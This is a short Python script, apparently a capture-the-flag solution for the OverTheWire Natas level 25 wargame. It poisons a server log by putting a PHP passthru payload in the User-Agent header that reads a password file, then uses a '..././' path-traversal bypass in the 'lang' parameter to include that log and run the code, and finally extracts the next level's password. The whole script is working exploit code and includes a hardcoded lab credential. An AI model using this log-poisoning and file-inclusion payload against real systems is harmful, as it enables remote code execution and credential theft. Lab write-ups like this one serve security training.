from pwn import *
import requests
import re

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
url = "http://{}.natas.labs.overthewire.org".format(username)
experimenter = "http://natas21-experimenter.natas.labs.overthewire.org/"

log.progress("Getting the natas13 password, Hold on! ")
header = {"User-Agent" : "<?php passthru('cat /etc/natas_webpass/natas26') ?>"}
session = requests.session()
web = session.get(url, auth = (username, password)).text
web = session.post(url, headers = header , data = {"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + session.cookies["PHPSESSID"] + ".log"}, auth = (username, password)).text
#print(session.cookies)
flag = re.findall("[A-Za-z0-9]{32}", web)
print("The password for natas26 is === " + flag[1])